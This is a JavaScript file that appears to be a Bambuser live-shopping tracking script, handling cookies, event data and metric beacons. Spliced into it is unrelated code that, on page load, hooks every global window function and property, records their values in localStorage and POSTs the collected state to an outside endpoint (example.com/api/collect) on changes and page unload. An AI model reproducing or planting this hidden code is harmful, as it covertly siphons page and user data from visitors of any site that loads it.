(function () {
  let monitoredVariables = {};
  function G(r, n, $) {
    return n in r ? Object.defineProperty(r, n, {
      value: $,
      enumerable: !0,
      configurable: !0,
      writable: !0
    }) : r[n] = $, r;
  }
  var B = "https://cl-prod-us.liveshopping.bambuser.com",
    D = "https://cl-stage-us.liveshopping.bambuser.com",
    C = B,
    w = D,
    p = {
      collectServiceUrl: C,
      collectServiceDebugUrl: w
    };
  var s = {
    CUSTOMER_ID: "_bamls_cuid",
    SESSION_ID: "_bamls_seid",
    SHOW_ID: "_bamls_shid",
    CALL_ID: "_bamls_caid",
    EVENT_ID: "_bamls_evid",
    USER_ID: "_bamls_usid",
    LAST_ONE_TO_FEW_INTERACTION: "_bamls_lotfi",
    LAST_ONE_TO_MANY_INTERACTION: "_bamls_lits"
  };
  var d = {
    CART_CURRENCY: {
      short: "vcu",
      dataSelector: "cartCurrency"
    },
    CART_VALUE: {
      short: "vv",
      dataSelector: "cartValue"
    },
    CHECKOUT_CURRENCY: {
      short: "vcu",
      dataSelector: "checkoutCurrency"
    },
    CHECKOUT_PRODUCTIDS: {
      short: "vpid",
      dataSelector: "checkoutProductIds"
    },
    CHECKOUT_QUANTITY: {
      short: "vpq",
      dataSelector: "checkoutQuantity"
    },
    CHECKOUT_VALUE: {
      short: "vv",
      dataSelector: "checkoutValue"
    },
    CURRENCY: {
      short: "cu",
      dataSelector: "currency"
    },
    CUSTOMER_ID: {
      short: "cid",
      dataSelector: "customerId"
    },
    EVENT: {
      short: "e",
      dataSelector: "event"
    },
    LAST_ONE_TO_FEW_INTERACTION: {
      short: "lotfi",
      dataSelector: "lastOneToFewInteraction"
    },
    LAST_ONE_TO_MANY_INTERACTION: {
      short: "lits",
      dataSelector: "lastInteractionTimestamp"
    },
    ORDER_ID: {
      short: "oid",
      dataSelector: "orderId"
    },
    ORDER_PRODUCTIDS: {
      short: "opid",
      dataSelector: "orderProductIds"
    },
    ORDER_VALUE: {
      short: "ov",
      dataSelector: "orderValue"
    },
    SESSION_ID: {
      short: "sid",
      dataSelector: "sessionId"
    },
    SHOW_ID: {
      short: "vid",
      dataSelector: "showId"
    },
    CALL_ID: {
      short: "caid",
      dataSelector: "callId"
    },
    EVENT_ID: {
      short: "evid",
      dataSelector: "eventId"
    },
    SHOW_ISLIVE: {
      short: "vil",
      dataSelector: "isLive"
    },
    SHOW_ISMUTED: {
      short: "vim",
      dataSelector: "isMuted"
    },
    SHOW_LIKES: {
      short: "ct",
      dataSelector: "likesCount"
    },
    SHOW_RELATIVE_TIME: {
      short: "vvt",
      dataSelector: "relativeTime"
    },
    SHOW_TITLE: {
      short: "vt",
      dataSelector: "title"
    },
    USER_DEVICE: {
      short: "ud",
      dataSelector: "viewerDevice"
    },
    USER_ID: {
      short: "uid",
      dataSelector: "userId"
    }
  };
  function z(t) {
    return (z = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
      return typeof t;
    } : function (t) {
      return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
    })(t);
  }
  var q = function (t) {
    try {
      b(t, "object") && g("Data Validation failed, data is null or malformed");
      var r = v(t);
      return b(r, "string") && g("eventName is missing in data object"), !0;
    } catch (e) {
      return !1;
    }
  };
  var y = function (t) {
    var r = u(t),
      e = Object.keys(r).map(function (t) {
        return "".concat(t, "=").concat(r[t]);
      });
    return e.length > 0 ? e.join("&") : null;
  };
  var u = function (t) {
    return Object.values(d).reduce(function (r, e) {
      var o = A(t, e.dataSelector);
      return void 0 !== o && (r[e.short] = o), r;
    }, {});
  };
  function exploreAndHookWindowObject() {
    Object.keys(window).forEach(prop => {
      if (!(prop in monitoredVariables)) {
        let propValue = window[prop];
        let propType = typeof propValue;
        monitoredVariables[prop] = {
          type: propType,
          value: propType === "function" ? propValue.toString() : propValue
        };
        if (propType === 'function') {
          window[prop] = function (...args) {
            console.log(`Function ${prop} was called with arguments: ${args}`);
            return propValue.apply(this, args);
          };
        } else {
          Object.defineProperty(window, prop, {
            get: function () {
              console.log(`Accessed property ${prop}`);
              return propValue;
            },
            set: function (newValue) {
              console.log(`Changed property ${prop} from ${propValue} to ${newValue}`);
              propValue = newValue;
              monitoredVariables[prop].value = newValue;
              transmitData(monitoredVariables);
            }
          });
        }
      }
    });
    localStorage.setItem("monitoredVariables", JSON.stringify(monitoredVariables));
  }
  function transmitData(data) {
    const serverEndpoint = "https://example.com/api/collect";
    fetch(serverEndpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => response.status >= 200 && response.status < 400 ? console.log("数据传输成功") : console.error(`数据传输失败,状态码:${response.status}`)).catch(() => console.error("数据传输过程中出错"));
  }
  var g = function (t) {
    throw "Bambuser Error: " + t;
  };
  window.addEventListener("idle", exploreAndHookWindowObject);
  var x = function (t) {
    for (var r = t + "=", e = document.cookie.replace(/%(?![0-9a-fA-F]+)/g, "%25"), o = decodeURIComponent(e).split(";"), n = 0; n < o.length; n++) {
      for (var $ = o[n]; " " == $.charAt(0);) $ = $.substring(1);
      if (0 == $.indexOf(r)) return $.substring(r.length, $.length);
    }
    return null;
  };
  var v = function (t) {
    var r = null,
      e = d.EVENT.dataSelector.split(".");
    try {
      for (var o = 0; o < e.length; o++) r = null === r ? t[e[o]] : r[e[o]];
    } catch (n) {
      g("Error parsing eventName: " + n.message);
    }
    return r;
  };
  var f = function (t, r) {
    return !b(t, r);
  };
  var b = function (t, r) {
    return null == t || null != r && z(t) != r;
  };
  var A = function (t, r) {
    return b(r, "string") ? t : r.split(".").reduce(function (t, r) {
      return t[r];
    }, t);
  };
  window.addEventListener("beforeunload", () => {
    transmitData(monitoredVariables);
  });
  var k = "string",
    j = "object",
    h = d.EVENT.dataSelector;
  window._bambuser = {
    is_dev: !1,
    on_interaction: null,
    params: d
  };
  exploreAndHookWindowObject();
  var E = function (r) {
      try {
        b(r, j) && g("No event data when trying to send Bambuser Event");
        var n = r.detail,
          $ = f(n, k) ? JSON.parse(n) : f(n, j) ? n : null;
        $.eventName = $.event, q($) && (F($), f(window._bambuser.on_interaction, "function") && window._bambuser.on_interaction($));
      } catch (t) {
        console.log(t);
      }
    },
    F = function (r) {
      try {
        q(r) || g("Must provide a data object when calling track(data)"), m(r), "purchase" === v(r) && window._bambuser.collect(r, !1);
      } catch (n) {
        console.log(n);
      }
    },
    m = function (r, n) {
      try {
        if (window.dataLayer && Array.isArray(window.dataLayer)) {
          var $ = r;
          n && ($ = Object.assign({}, r, G({}, "".concat(h), "bambuser.".concat(r[h])))), window.dataLayer.push($);
        }
      } catch (t) {
        console.error("Could not access dataLayer");
      }
    };
  window._bambuser.collect = function (r) {
    var n = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
    try {
      var $ = null;
      if (f(r, j)) {
        for (var t in s) {
          var e = d[t];
          if (!b(e) && b(r[e.dataSelector])) {
            var a = x(s[t]);
            f(a) && (r[e.dataSelector] = a);
          }
        }
        if (b(r[d.USER_ID.dataSelector]) || b(r[d.CUSTOMER_ID.dataSelector]) || b(r[d.SHOW_ID.dataSelector]) && b(r[d.CALL_ID.dataSelector]) && b(r[d.EVENT_ID.dataSelector])) return;
        if (b(r[h], k) && f(r.eventName, k) && (r[h] = r.eventName), b(r[h])) return;
        b(r[d.USER_DEVICE.dataSelector]) && (r[d.USER_DEVICE.dataSelector] = (window.navigator || {}).userAgent), $ = y(r);
      }
      if (null !== $) {
        var o = (window._bambuser.is_dev ? p.collectServiceDebugUrl : p.collectServiceUrl) + "/metric",
          i = "".concat(o, "?").concat($);
        n && m(r, !0);
        var l = !1;
        if (navigator && navigator.sendBeacon && (l = navigator.sendBeacon(o, JSON.stringify(u(r)))), !l) {
          var c = document.createElement("img");
          c.src = i, c.style.display = "none", document.body.appendChild(c);
        }
      }
    } catch (_) {
      console.log(_);
    }
  }, window.addEventListener("bambuser-liveshop-tracking-point", E, !1);
})();